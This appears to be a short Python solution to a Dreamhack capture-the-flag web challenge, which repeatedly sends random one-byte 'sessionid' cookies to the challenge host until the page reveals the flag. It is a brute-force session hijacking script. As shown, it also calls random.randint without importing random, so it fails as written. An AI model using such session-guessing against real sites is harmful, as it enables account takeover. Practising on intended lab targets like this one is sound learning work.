import requests
import os
 

url = 'http://host3.dreamhack.games:16673/'

local_port = random.randint(1500, 1800)
while(True):
    
    admin_hex = os.urandom(1).hex()
    cookie = {'sessionid': admin_hex}

    resp = requests.get(url, cookies=cookie)
    if 'flag is ' in resp.text:
        print(resp.text[resp.text.find('flag is') : ])
        break

